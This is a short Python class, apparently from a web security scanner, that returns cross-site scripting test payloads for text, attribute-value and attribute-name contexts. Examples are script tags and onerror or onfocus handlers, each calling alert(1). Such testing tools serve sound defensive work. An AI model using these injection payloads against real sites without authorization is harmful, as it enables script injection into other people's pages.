class PayloadGenerator:
    def __init__(self):
        pass

    def for_context(self, context):
        """
        Generate payloads depending on context.
        Required contexts:
        - text
        - attribute-value
        - attribute-name
        """
        if context == "text":
            return ['"><script>alert(1)</script>', '<img src=x onerror=alert(1)>']

        if context == "attribute-value":
            return ['"onmouseover="alert(1)', "' autofocus onfocus=alert(1) '"]

        if context == "attribute-name":
            return ['onxxx=alert(1)', 'onclick=alert(1)']

        return ['<script>alert(1)</script>']
